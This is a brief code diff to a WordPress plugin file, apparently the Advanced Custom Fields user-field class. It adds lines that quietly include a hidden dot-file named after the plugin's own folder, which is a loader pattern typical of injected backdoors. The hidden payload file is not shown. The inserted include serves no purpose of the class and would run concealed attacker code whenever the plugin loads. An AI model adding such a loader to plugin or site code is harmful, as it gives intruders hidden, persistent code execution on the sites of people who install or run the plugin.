@@ -2,6 +2,10 @@
 
 if( ! class_exists('ACF_Field_User') ) :
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class ACF_Field_User extends ACF_Field {
 	
 	/**
